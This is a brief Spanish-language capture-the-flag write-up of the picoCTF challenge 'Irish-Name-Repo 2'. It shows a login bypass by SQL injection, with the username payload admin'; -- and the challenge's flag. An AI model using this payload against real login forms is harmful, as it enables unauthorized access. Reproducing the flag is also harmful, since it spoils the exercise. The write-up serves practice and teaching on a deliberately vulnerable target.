# Irish-Name-Repo 2

## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849
## Pistas
- The password is being filtered.
## Solucion
```
Nos metemos en la ventana de login 
ponemos de usuario admin'; -- lo que nos da acceso 
y obtenemos la bandera
# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}

```

## Bandera

picoCTF{m0R3_SQL_plz_fa983901}

## Notas adicionales

## Referencias
[SQL injection on OWASP](https://owasp.org/www-community/attacks/SQL_Injection)